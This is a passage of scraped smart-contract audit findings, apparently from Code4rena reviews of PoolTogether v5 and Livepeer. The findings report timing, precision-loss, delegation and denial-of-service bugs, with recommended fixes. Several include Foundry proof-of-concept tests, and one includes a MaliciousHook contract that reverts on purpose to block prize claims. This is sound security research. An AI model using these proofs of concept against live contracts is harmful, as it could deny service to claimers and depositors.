https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/main/src/libraries/TwabLib.sol#L244-L251 https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/main/src/libraries/TwabLib.sol#L650-L658   # Vulnerability details  ## Comments The previous implementation allowed a malicious user to keep updating their balances provided the previous observation fell within the same period. As such, if a draw ends part way through a period, the user would be able to manipulate their average balance for period and therefore increase their odds of winning in that draw despite the draw already being closed.  Note: I have arbitrarily chosen M-13 for this report rather than M-03 since both share the same PR for their respective mitigations.  ## Mitigation The updated implementation overlaps with M-03 and ensures that twab queries are aligned on twab period boundaries. It also ensures that any Twab queries have an end time that is finalised; i.e. the period that is being queried for has ended. This ensures that a user can't manipulate their Twab balance between the time that a draw period ends and a Twab period ends. The original issue has been resolved, but a new issue has been introduced.  ## New issue Claiming prizes is bricked if prize periods are not aligned with twab periods  ## Proof Of Concept Although the updated logic solves the original issue about ensuring that the observations are safe (i.e. finalised) and observations can't be manipulated, the change has introduced a new issue where prize claiming is bricked if the twab periods are not completely aligned or are not significantly shorter than the prize pool periods (claiming is still bricked, but for a shorter duration). This was not the case before and in fact the only requirement was that \u201cIt is imperative that PoolTogether uses periods that are\u00a0smaller\u00a0than a single draw\u201d. With the change, this is now only partially true. Either the Twab period needs to be significantly smaller than a prize draw period, or alternatively the period needs to be exactly aligned with the draw period. For example, if a draw is 1 day but the period for the accumulator is 20 hours it is possible that the there will be a 20 hour period during which any claims will revert due to the end time not yet being finalised. This could result in two possible issues: either prizes will go unclaimed altogether, or more fees are paid to claimers since the price of the auction is increasing during this bricked period. Claiming prizes will be bricked up to the maximum period length of the accumulator, assuming the twab period started 1 second before the draw period ended and the twab period was the same length as the draw period.  To illustrate this issue further, let's explore the updated implementation. When prizes are claimed, the winning odds are calculated, which includes a call to `getTwabBetween` in the `TwabController.sol` contract:  ```   function getTwabBetween(     address vault,     address user,     uint32 startTime,     uint32 endTime   ) external view returns (uint256) {     TwabLib.Account storage _account = userObservations[vault][user];     // We snap the timestamps to the period end on or after the timestamp because the total supply records will be sparsely populated.     // if two users update during a period, then the total supply observation will only exist for the last one.     return       TwabLib.getTwabBetween(         PERIOD_LENGTH,         PERIOD_OFFSET,         _account.observations,         _account.details,         _periodEndOnOrAfter(startTime),         _periodEndOnOrAfter(endTime)       );   } ```  The start and end times passed as arguments corresponds to the start and end times of the prize tier draw frequency (i.e. daily for the highest prize tier). These times are then aligned to Twab period boundaries with the underlying `_periodEndOnOrAfter` call.  The key point now is that the underlying `getTwabBetween` call requires the end time to be finalised:  ``` function getTwabBetween(     uint32 PERIOD_LENGTH,     uint32 PERIOD_OFFSET,     ObservationLib.Observation[MAX_CARDINALITY] storage _observations,     AccountDetails memory _accountDetails,     uint32 _startTime,     uint32 _endTime   ) internal view requireFinalized(PERIOD_LENGTH, PERIOD_OFFSET, _endTime) returns (uint256) { ```  where `requireFinalized` looks like:  ``` modifier requireFinalized(uint32 PERIOD_LENGTH, uint32 PERIOD_OFFSET, uint256 _timestamp) {     // The current period can still be changed; so the start of the period marks the beginning of unsafe timestamps.     uint32 overwritePeriodStartTime = _currentOverwritePeriodStartedAt(PERIOD_LENGTH, PERIOD_OFFSET);     // timestamp == overwritePeriodStartTime doesn't matter, because the cumulative balance won't be impacted     if (_timestamp > overwritePeriodStartTime) {       revert TimestampNotFinalized(_timestamp, overwritePeriodStartTime);     }     _;   } ```  For the sake of argument, let's say that a claimer is trying to claim a prize for the highest tier that is drawn daily, and the twab period ends 1 hour before the draw period. Now, when a claimer tries to claim the prize the initial `getTwabBetween` call will align the start and end times to twab period boundaries. So the start time will align to the end of the last period, and the end time will align to the end of the current period. However the current period hasn't finalised yet! The current period finalises 23 hours after the draw has completed, which means that any prize claims for the tier will revert. During this time the auction is still running, so the fee is perpetually increasing. After the 23 hours have elapsed, the claimers now only have 1 hour to claim the prizes, leading to either of the two scenarios mentioned above.  ## Tools used Manual review  ## Recommendation I recommend aligning the shortest prize period to the twab period and enforcing this in the constructor of the Prize Pool contract.    ## Assessed type  Timing"}, {"title": "Loss of precision in the YieldVault causes DoS when depositing from the Vault", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/79", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "unmitigated", "edited-by-warden", "MR-M-22"], "target": "2023-08-pooltogether-mitigation-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1176-L1184   # Vulnerability details  # Title Loss of precision in the YieldVault causes DoS when depositing from the Vault  ## Original Issue [M-22 - Loss of precision leads to undercollateralized](https://github.com/code-423n4/2023-07-pooltogether-findings/issues/143)  ## Details The original demonstrates how the Vault could fall into undercollateralization mode if the YieldVault rounds down the deposits causing a loss of precision. - The problem was caused because the number of minted shares (_totalSupplyAmount) would be greater than the number of deposited assets in the YieldVault (_withdrawableAssets) because of the loss of precision when rounding down the amount of deposited assets in the YieldVault.  ## Mitigation The mitigation was to refactor the way the Vault determines if it's collateralized or not, as part of this change, the `_currentExchangeRate()` function was removed, and instead new logic was implemented to make that the shares are fully backed 1:1 to assets in the YieldVault. Now, with the new logic, when depositing in the Vault, there is a check that validates if the deposited assets in the YieldVault were the exact amount of deposited assets.    ### Conclusion of the Mitigation and Proof of Concept of the New Bug The implemented mitigation prevents the Vault from falling into under-collateralization but now introduces a new bug where the deposits could fall into DoS because of the loss of precision in the YieldVault because most vaults will do rounds-down shares calculations. For example: depositing `1000000000`, but it can only withdraw `999999999`. - Using the above example with the new implementation:   - 1. The vault will deposit into the YieldVault `1000000000`   - 2. The YieldVault will cause the loss of precision, thus, the totalWithdrawableAssets in the YieldVault was increased by `999999999` instead of `1000000000`.   - 3. The Vault will validate if the withdrawableAssetsAfter the deposit is greater than the previousWithdrawableAssets + the depositedAmount   - 4. The check will fail because the withdrawableAssetsAfter is less than (previousWithdrawableAssets + the depositedAmount)     - The reason is because **withdrawableAssetsAfter is actually (previousWithdrawableAssets + `999999999`)** (Because of the loss of precision)     - **_expectedWithdrawableAssets == (previousWithdrawableAssets + `1000000000`)**      - So **the check is actually comparing ==> (previousWithdrawableAssets + `999999999`) < (previousWithdrawableAssets + `1000000000`)**, thus, the tx will be reverted!  ```solidity function _deposit(   address _caller,   address _receiver,   uint256 _assets ) internal onlyVaultCollateralized {   // It is only possible to deposit when the vault is collateralized   // Shares are backed 1:1 by assets   if (_assets == 0) revert MintZeroShares();    uint256 _vaultAssets = _asset.balanceOf(address(this));    ...    uint256 _withdrawableAssets = _totalAssets();    _yieldVault.deposit(_assets, address(this));    uint256 _expectedWithdrawableAssets = _withdrawableAssets + _assets;   uint256 _withdrawableAssetsAfter = _totalAssets();    if (_withdrawableAssetsAfter < _expectedWithdrawableAssets)     revert YVWithdrawableAssetsLTExpected(_withdrawableAssetsAfter, _expectedWithdrawableAssets);    _mint(_receiver, _assets);    emit Deposit(_caller, _receiver, _assets, _assets); } ```  ### Coded PoC - Add the below test to the [`Deposit.t.sol`](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/test/unit/Vault/Deposit.t.sol) test file. ```solidity function testLossPrecision() external {   vm.startPrank(alice);      //0.Constructing a yieldVault that is already profitable   uint256 _amount = 333e18;   underlyingAsset.mint(alice, _amount);   underlyingAsset.approve(address(yieldVault), type(uint256).max);      yieldVault.deposit(_amount,alice);   //profitable 0.1e18   underlyingAsset.mint(address(yieldVault), 0.1e18);    //1.alice deposit   _amount = 100e18;   underlyingAsset.mint(alice, _amount);   underlyingAsset.approve(address(vault), type(uint256).max);   vault.deposit(_amount, alice);   return;   } ```  - Run the PoC, the results will be similar to: > forge test --match-test testLossPrecision ``` Running 1 test for test/unit/Vault/Deposit.t.sol:VaultDepositTest [FAIL. Reason: YVWithdrawableAssetsLTExpected(99999999999999999999 [9.999e19], 100000000000000000000 [1e20])] testLossPrecision() (gas: 302275) Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.87ms Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)  Failing tests: Encountered 1 failing test in test/unit/Vault/Deposit.t.sol:VaultDepositTest [FAIL. Reason: YVWithdrawableAssetsLTExpected(99999999999999999999 [9.999e19], 100000000000000000000 [1e20])] testLossPrecision() (gas: 302275)  Encountered a total of 1 failing tests, 0 tests succeeded ```  ## Impact Deposits will fall into DoS for `YieldVaults` that calculates shares rounding down when depositing (The exact same reason as the original issue) - The cause of the new bug is the same reason as the original issue, but this time, **the consequence is a DoS on the Deposit functionality in the Vault** instead of causing the vault to fall into under-collateralization  ## Recommended Mitigation Steps - The recommendation to prevent the DoS would be to consider the loss of precision caused in the YieldVault when doing the deposit, and when calculating the `_expectedWithdrawableAssets`, instead of adding the exact amount of assets that were deposited in the YieldVault, compute the value after the loss of precision that will be caused in the YieldVault, in this way, if a loss of precision happens in the YieldVault, the `_expectedWithdrawableAssets` has already accounted for it, and the check will now compare the correct values.  ```solidity function _deposit(   address _caller,   address _receiver,   uint256 _assets ) internal onlyVaultCollateralized {   // It is only possible to deposit when the vault is collateralized   // Shares are backed 1:1 by assets   if (_assets == 0) revert MintZeroShares();    uint256 _vaultAssets = _asset.balanceOf(address(this));    ...    uint256 _withdrawableAssets = _totalAssets();    _yieldVault.deposit(_assets, address(this));  - uint256 _expectedWithdrawableAssets = _withdrawableAssets + _assets;    //audit-info => Compute the value of assets with the loss of precision that happened in the YieldVault + uint256 amountWithLossOfPrecision = _assetsWithLossOfPrecission + uint256 _expectedWithdrawableAssets = _withdrawableAssets + amountWithLossOfPrecision;    uint256 _withdrawableAssetsAfter = _totalAssets();    if (_withdrawableAssetsAfter < _expectedWithdrawableAssets)     revert YVWithdrawableAssetsLTExpected(_withdrawableAssetsAfter, _expectedWithdrawableAssets);    _mint(_receiver, _assets);    emit Deposit(_caller, _receiver, _assets, _assets); } ```   ## Assessed type  Context"}, {"title": "M-02 - Malicious users can set their hooks to contracts that will always revert, causing Claimers to get their tx to claim the user's prizes to be reverted", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/69", "labels": ["bug", "2 (Med Risk)", "satisfactory", "sponsor confirmed", "unmitigated", "MR-M-02", "edited-by-warden"], "target": "2023-08-pooltogether-mitigation-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1318-L1357   # Vulnerability details  # Title M-02 - Malicious users can set their hooks to contracts that will always revert, causing Claimers to get their tx to claim the user's prizes to be reverted   ## Original Issue [M-02 - Unintended or Malicious Use of Prize Winners' Hooks](https://github.com/code-423n4/2023-07-pooltogether-findings/issues/465)  ## Details The previous implementation claimed the prizes for all the winners in one single transaction, each winner was allowed to set arbitrary hooks that would cause the Vault contract to perform arbitrary calls to the address of the user's hooks. As the original issue mentions, some consequences of allowing executions to arbitrary addresses are unauthorized side transactions with gas paid unbeknownst to the claimer, reentrant calls, or denial-of-service attacks on claiming transactions.  ## Mitigation The mitigation implements a limit of gas that can be spent on each hook's call, and now the hook's call is made using a try-catch block.  The issue about causing DoS on other users is still present, when using a Claimer to claim a user's prizes in batches, if at least one of the hook's calls reverts, the whole tx claim the user's prizes will be reverted.  ```solidity   function claimPrize(     ...   ) external onlyClaimer returns (uint256) {     ...      if (hooks.useBeforeClaimPrize) {       try         hooks.implementation.beforeClaimPrize{ gas: HOOK_GAS }(           _winner,           _tier,           _prizeIndex,           _fee,           _feeRecipient         )       returns (address result) {         recipient = result;       } catch (bytes memory reason) {         revert BeforeClaimPrizeFailed(reason);       }     } else {       recipient = _winner;     }      ...      if (hooks.useAfterClaimPrize) {       try         hooks.implementation.afterClaimPrize{ gas: HOOK_GAS }(           _winner,           _tier,           _prizeIndex,           prizeTotal,           recipient         )       {} catch (bytes memory reason) {         revert AfterClaimPrizeFailed(reason);       }     }      return prizeTotal;   } ```  ### Conclusion of the Mitigation and Proof of Concept of the New Bug The mitigation solves most of the problems described in the original issue, but the problem of causing DoS to claim other user's prizes is still present. - As part of the mitigation, now the hook's calls are made in a try-catch block, and if the hook's call fails, a revert() is executed, and the whole tx to claim prizes will be reverted.  - The underlying problem is the same described as in the original issue, this time, a malicious user can set a malicious contract that will always revert as the hook of its account, this will cause when this contract is called, the tx to claim prizes will revert, causing losses to claimers, because the gas they spent attempting to claim the prizes will be paid regardless the tx is reverted or not.   - If claimers are continuously getting their tx reverted because of malicious hooks they might be disincentivized from continuing to offer themselves to claim the prizes on behalf of the users.  ```solidity   function claimPrize(     ...   ) external onlyClaimer returns (uint256) {     ...      if (hooks.useBeforeClaimPrize) {       try         hooks.implementation.beforeClaimPrize{ gas: HOOK_GAS }(           _winner,           _tier,           _prizeIndex,           _fee,           _feeRecipient         )       returns (address result) {         recipient = result;       } catch (bytes memory reason) {         //@audit-issue => Malicious hooks can force a revert which will cause the whole tx to be reverted         revert BeforeClaimPrizeFailed(reason);       }     } else {       recipient = _winner;     }      ...      if (hooks.useAfterClaimPrize) {       try         hooks.implementation.afterClaimPrize{ gas: HOOK_GAS }(           _winner,           _tier,           _prizeIndex,           prizeTotal,           recipient         )       {} catch (bytes memory reason) {         //@audit-issue => Malicious hooks can force a revert which will cause the whole tx to be reverted         revert AfterClaimPrizeFailed(reason);       }     }      return prizeTotal;   } ```  Flow to claim prizes when a Claimer is enabled: - [Claimer::claimPrizes()](https://github.com/GenerationSoftware/pt-v5-claimer/blob/main/src/Claimer.sol#L91-L117) ==> [Vault::claimPrize()](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1308-L1360) ==> hookBefore() && [PrizePool::claimPrize()](https://github.com/GenerationSoftware/pt-v5-prize-pool/blob/main/src/PrizePool.sol#L415-L492) && hookAfter()    - The claimer will try to claim the prizes for all the winners, it will iterate over the list of winners and will call individuall the Vault::claimPrize() function where it will execute hooks (if they are enabled) and claim the prizes in the PrizePool, if the claiming for that winner succeeds, the flow goes back to Claimer::claimPrizes(), where it will call again the Vault::claimPrize() for the next winner.     - If one winner has a malicious contract as its hook that forces a revert, the claiming for all the users will be reverted.  ### Coded PoC - Add the next test to the [`Vault.t.sol`](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/test/unit/Vault/Vault.t.sol) test file in the Vault repository ```solidity function testClaimPrizeMaliciousHookPoC() public {   MaliciousHook maliciousHook = new MaliciousHook();   vm.startPrank(alice);   VaultHooks memory hooks = VaultHooks({     useBeforeClaimPrize: true,     useAfterClaimPrize: false,     implementation: IVaultHooks(address(maliciousHook))   });   vault.setHooks(hooks);   vm.stopPrank();    vm.startPrank(address(claimer));    mockPrizePoolClaimPrize(uint8(1), alice, 0, address(maliciousHook), 1e18, address(claimer));   claimPrize(uint8(1), alice, 0, 1e18, address(claimer));    vm.stopPrank(); } ```  - Create the `MaliciousHook.sol` contract in the [src/ folder](https://github.com/GenerationSoftware/pt-v5-vault/tree/main/src) ```solidity // SPDX-License_Identifier: MIT pragma solidity ^0.8.19;  contract MaliciousHook {    function beforeClaimPrize(     address winner,     uint8 tier,     uint32 prizeIndex   ) external returns (address) {     revert(\"Forcing to revert\");   }  } ```  - Run the PoC, this is the expected result: > forge test --match-test testClaimPrizeMaliciousHookPoC ``` Running 1 test for test/unit/Vault/Vault.t.sol:VaultTest [FAIL. Reason: BeforeClaimPrizeFailed(0x)] testClaimPrizeMaliciousHookPoC() (gas: 140886) Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 7.24ms Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)  Failing tests: Encountered 1 failing test in test/unit/Vault/Vault.t.sol:VaultTest [FAIL. Reason: BeforeClaimPrizeFailed(0x)] testClaimPrizeMaliciousHookPoC() (gas: 140886)  Encountered a total of 1 failing tests, 0 tests succeeded ```  ## Impact Claimers can get their TX reverted if a malicious winner sets his hook to a malicious contract that will always revert, which will cause the whole tx to claim the user's prizes to be reverted.  ## Recommended Mitigation Steps - The mitigation for this issue would be to instead of reverting the tx, just emit an event and return a 0 (this indicates that 0 prizes were claimed for that winner), In this way, the tx to claim prizes will continue its execution and will be able to claim the prizes for the rest of winners.  ```solidity   function claimPrize(     ...   ) external onlyClaimer returns (uint256) {     ...      if (hooks.useBeforeClaimPrize) {       try         hooks.implementation.beforeClaimPrize{ gas: HOOK_GAS }(           _winner,           _tier,           _prizeIndex,           _fee,           _feeRecipient         )       returns (address result) {         recipient = result;       } catch (bytes memory reason) { -       revert BeforeClaimPrizeFailed(reason); +       emit BeforeHookExecutionFailed(_winner,reason); +       return 0;       }     } else {       recipient = _winner;     }      ...      if (hooks.useAfterClaimPrize) {       try         hooks.implementation.afterClaimPrize{ gas: HOOK_GAS }(           _winner,           _tier,           _prizeIndex,           prizeTotal,           recipient         )       {} catch (bytes memory reason) { -       revert AfterClaimPrizeFailed(reason); +       emit AfterHookExecutionFailed(_winner,reason);         //@audit-info => In case the prizes were claimed, so fees are charged! +       uint claimed = prizeTotal ! 0 = prizeTotal : 0; +       return claimed;       }     }      return prizeTotal;   } ```       ## Assessed type  Context"}, {"title": "Vault will stop participating in draws in case if they deposited maximum assets to the underlying vault", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/67", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed"], "target": "2023-08-pooltogether-mitigation-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1399   # Vulnerability details  ## Impact Vault will stop participating in draws in case if they deposited maximum assets to the underlying vault.  ## Proof of Concept Vault contract [has `maxMint` function](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L506-L515). This function first checks allowed amount to mint in the PtVault and then also [checks amount allowed in underlying vault](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L512-L514). It is very likely that this value will be less than in PtVault as some vaults can have restriction for 1 staker.  This means that once such amount of shares is minted, then [it's not allowed to mint anymore](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L1398-L1399), so each deposit/mint will revert.  In order to contribute earned yield to the prize pool, liquidation pair should call `liquidate` function. It's the only way to send earned yield to the prize pool. The process is next: liquidator will provide POOl tokens on behalf of Vault and Vault [should mint corresponding amount of shares](https://github.com/GenerationSoftware/pt-v5-vault/blob/main/src/Vault.sol#L783) for liquidator. In case if this call will be done after max amount is minted, then it will revert, which means that it will be not possible to send earned yield to the pool and earn prizes. In this moment the main purpose of vault stopped working: users earned yield to participate in prize distributions, but they can't do that.  Of course, when someone will withdraw, then it will be possible to liquidate again, but that will lead to bad user experience and also someone can ddos pool, by depositing again to not allow send contributions to the prize pool.  Another thing that is related to this issue is that in case if maxMint was reached, then `mintYieldFee` can't be called as well, as it also mints shares. ## Tools Used VsCode ## Recommended Mitigation Steps Maybe it will be best to not check for maxMint for liquidations and fee minting.   ## Assessed type  Error"}, {"title": "New undelegation logic is broken, it won't work if the currentDelegate is already the SPONSORSHIP_ADDRESS", "html_url": "https://github.com/code-423n4/2023-08-pooltogether-mitigation-findings/issues/39", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "MR-H-06"], "target": "2023-08-pooltogether-mitigation-findings", "body": "# Lines of code  https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/main/src/TwabController.sol#L645-L651   # Vulnerability details  ## Original Issue [H-06 - Resetting delegation will result in user funds being lost forever](https://github.com/code-423n4/2023-07-pooltogether-findings/issues/206)  ## Details The previous implementation to reset the delegation was causing that the users lost their own delegate balance if they tried to reset the delegation to themselves by setting the `_to` parameter as the address(0), which that is the value used to determine if a user is the delegate or not.  - In a short summary, when the users delegated their delegate balance to another address, the default value for the delegated balance was updated to the new delegatee, and if the user wanted to reset the delegation to themselves, if they would _to as address(0), the underlying _transferDelegateBalance call will mistakenly move the delegated user funds to the 0 address.   - At this point the user might try to call delegate again with their actual address, however now the (_to == _currentDelegate) check will be true and revert, because of the behaviour specified earlier. The user also can't delegate to any other address because they don't own their own delegate balance anymore. Their funds are officially lost forever.   ## Mitigation The implemented mitigation is attempting to treat the value of the `_to` parameter to be used as indicative of an undelegation operation. - If the `_to` parameter is the address(0), the delegate will be set to the `SPONSORSHIP_ADDRESS`, otherwise it will not be updated.  ### Conclusion of the Mitigation and Proof of Concept of the new Bug - This mitigation introduces a new bug in the undelegation process.   - The problem is that if the `_currentDelegate` is already the `SPONSORSHIP_ADDRESS`, and the user set `_to` as the address(0), the `to` address will be set also as the `SPONSORSHIP_ADDRESS`, this will cause the execution to be reverted because the `to` address is equals to the `_currentDelegate`.    - There are different ways how the `_currentDelegate` could end up being set to the `SPONSORSHIP_ADDRESS`, one of them is if the user calls the sponsor() in the Vault contract.   - I coded a small PoC to demonstrate that this new undelegation logic will revert then the `_currentDelegate` is already set to the `SPONSORSHIP_ADDRESS` and the user wants to undelegate its delegate balance by passing the address(0) as the `to` parameter.  ### Coded PoC - Add the below testFunction in the [TwabController.t.sol](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/main/test/TwabController.t.sol) file  ```solidity function testFirstSponsorshipAndThenUndelegate() external {   address _sponsorshipAddress = SPONSORSHIP_ADDRESS;    assertEq(twabController.delegateOf(mockVault, alice), alice);    vm.startPrank(mockVault);   //@audit => Alice's funds in the mockVault are delegated to the sponsor   twabController.sponsor(alice);    assertEq(twabController.delegateOf(mockVault, alice), _sponsorshipAddress);    uint96 _amount = 1000e18;   twabController.mint(alice, _amount);    assertEq(twabController.balanceOf(mockVault, alice), _amount);   assertEq(twabController.delegateBalanceOf(mockVault, alice), 0);    assertEq(twabController.balanceOf(mockVault, _sponsorshipAddress), 0);   assertEq(twabController.delegateBalanceOf(mockVault, _sponsorshipAddress), 0);   vm.stopPrank();    //@audit => Now alice want to undelegate the SPONSORSHIP_ADDRESS using the new logic to perform undelegations   vm.startPrank(alice);   twabController.delegate(mockVault,address(0));   vm.stopPrank(); } ```  - Run the PoC: `forge test -m testFirstSponsorshipAndThenUndelegate -vvvv` And this is the expected result, the tx to delegate to the address(0) should revert with the error message: \"SameDelegateAlreadySet\" ```   [109875] TwabControllerTest::testFirstSponsorshipAndThenUndelegate()     \u251c\u2500 [2988] TwabController::delegateOf(0x0000000000000000000000000000000000001234, Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f]) [staticcall]     \u2502   \u2514\u2500 \u2190 Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f]     \u251c\u2500 [0] VM::startPrank(0x0000000000000000000000000000000000001234)     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [31314] TwabController::sponsor(Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f])     \u2502   \u251c\u2500 emit Delegated(vault: 0x0000000000000000000000000000000000001234, delegator: Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f], delegate: 0x0000000000000000000000000000000000000001)     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [986] TwabController::delegateOf(0x0000000000000000000000000000000000001234, Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f]) [staticcall]     \u2502   \u2514\u2500 \u2190 0x0000000000000000000000000000000000000001     \u251c\u2500 [48656] TwabController::mint(Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f], 1000000000000000000000)     \u2502   \u251c\u2500 emit IncreasedBalance(vault: 0x0000000000000000000000000000000000001234, user: Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f], amount: 1000000000000000000000, delegateAmount: 0)     \u2502   \u251c\u2500 emit IncreasedTotalSupply(vault: 0x0000000000000000000000000000000000001234, amount: 1000000000000000000000, delegateAmount: 0)     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [807] TwabController::balanceOf(0x0000000000000000000000000000000000001234, Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f]) [staticcall]     \u2502   \u2514\u2500 \u2190 1000000000000000000000     \u251c\u2500 [840] TwabController::delegateBalanceOf(0x0000000000000000000000000000000000001234, Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f]) [staticcall]     \u2502   \u2514\u2500 \u2190 0     \u251c\u2500 [2807] TwabController::balanceOf(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000001) [staticcall]     \u2502   \u2514\u2500 \u2190 0     \u251c\u2500 [840] TwabController::delegateBalanceOf(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000001) [staticcall]     \u2502   \u2514\u2500 \u2190 0     \u251c\u2500 [0] VM::stopPrank()     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [0] VM::startPrank(Alice: [0x8CE502537D13f249834eAa02DDe4781EBFe0d40f])     \u2502   \u2514\u2500 \u2190 ()     \u251c\u2500 [1056] TwabController::delegate(0x0000000000000000000000000000000000001234, 0x0000000000000000000000000000000000000000)     \u2502   \u2514\u2500 \u2190 \"SameDelegateAlreadySet(0x0000000000000000000000000000000000000001)\"     \u2514\u2500 \u2190 \"SameDelegateAlreadySet(0x0000000000000000000000000000000000000001)\"  Test result: FAILED. 0 passed; 1 failed; finished in 2.36ms  Failing tests: Encountered 1 failing test in test/TwabController.t.sol:TwabControllerTest [FAIL. Reason: SameDelegateAlreadySet(0x0000000000000000000000000000000000000001)] testFirstSponsorshipAndThenUndelegate() (gas: 109875) ```  ## Recommended Mitigation Steps - The recommendation would be to set the `to` address to be the user's address instead of the SPONSORSHIP_ADDRESS, in this way the new undelegation process won't fail if the `_currentDelegate` has already been set to the SPONSORSHIP_ADDRESS.  ```solidity function _delegate(address _vault, address _from, address _to) internal {   address _currentDelegate = _delegateOf(_vault, _from);   ...  - address to = _to == address(0) ? SPONSORSHIP_ADDRESS : _to; + address to = _to == address(0) ? _from : _to;    if (to == _currentDelegate) {     revert SameDelegateAlreadySet(to);   }    ... } ```   ## Assessed type  Context"}, {"title": "Spec: Wrong description of `Parameters` in `LIP-92`", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/209", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "sufficient quality report", "Q-03"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/main/contracts/bonding/BondingManager.sol#L1-L1674   # Vulnerability details  ## Impact Users usually go to the docs & specification to see how to integrate a project. Currently the documentation and the code do not match. ## Proof of Concept - Take a look at [LIP-92](https://github.com/livepeer/LIPs/blob/master/LIPs/LIP-92.md#parameters) : ``` Parameters contract BondingManager {     function treasuryRewardCut() external view returns (uint256);     function setTreasuryRewardCut(uint256 _value) external; // @audit this is NOT the setTreasuryRewardCut and _value, it's the setTreasuryRewardCutRate and _cutRate.      function nextRoundTreasuryRewardCut() external view returns (uint256);      function treasuryBalanceCeiling() external view returns (uint256);     function setTreasuryBalanceCeiling(uint256 _value) external; // @audit this is NOT the _value, it's the _ceiling.  } ``` 1. The current implementation of the `BondingManager.sol` contract does not have the function `treasuryRewardCut()`. 2. The current implementation of the `BondingManager.sol` contract does not have the function `setTreasuryRewardCut()`. Instead there is a `setTreasuryRewardCutRate()` function : [here](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L167-L169) ``` File: BondingManager.sol 167:    function setTreasuryRewardCutRate(uint256 _cutRate) external onlyControllerOwner { 168:        _setTreasuryRewardCutRate(_cutRate); 169:    } ``` 3. The current implementation of the `BondingManager.sol` contract does not have the function `nextRoundTreasuryRewardCut()` 4. The current implementation of the `BondingManager.sol` contract does not have the function `treasuryBalanceCeiling()`. 5. Wrong `setTreasuryBalanceCeiling()` interface : - In Spec : ``` function setTreasuryBalanceCeiling(uint256 _value) external // @audit this is NOT the _value, it's the _ceiling. ``` - In `BondingManager.sol` : [here](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/bonding/BondingManager.sol#L176) ``` File: BondingManager.sol 176:    function setTreasuryBalanceCeiling(uint256 _ceiling) external onlyControllerOwner { ``` ## Tools Used Manual review ## Recommended Mitigation Steps Use the correct docs by fixing the mentioned issues.   ## Assessed type  Other"}, {"title": "The logic in _handleVoteOverride to determine if an account is transcoder is not consistent with the logic in the BondManager.sol", "html_url": "https://github.com/code-423n4/2023-08-livepeer-findings/issues/206", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "sufficient quality report", "M-01"], "target": "2023-08-livepeer-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L184   # Vulnerability details  ## Impact  The logic in _handleVoteOverride to determine if an account is transcoder has issue  ## Proof of Concept  In the current implementation,  when a voting, the function [_countVote is triggered](https://github.com/code-423n4/2023-08-livepeer/blob/a3d801fa4690119b6f96aeb5508e58d752bda5bc/contracts/treasury/GovernorCountingOverridable.sol#L151), this function is overriden in the function GovernorCountingOverridable.sol  ```solidity     _weight = _handleVoteOverrides(_proposalId, tally, voter, _account, _weight); ```  this is calling:  ```solidity    function _handleVoteOverrides(         uint256 _proposalId,         ProposalTally storage _tally,         ProposalVoterState storage _voter,         address _account,         uint256 _weight     ) internal returns (uint256) {          uint256 timepoint = proposalSnapshot(_proposalId);          address delegate = votes().delegatedAt(_account, timepoint);          // @audit         // is transcoder?         bool isTranscoder = _account == delegate;              if (isTranscoder) {             // deduce weight from any previous delegators for this transcoder to             // make a vote             return _weight - _voter.deductions;         } ```  the logic to determine if an account is the transcoder is too simple in this [line of 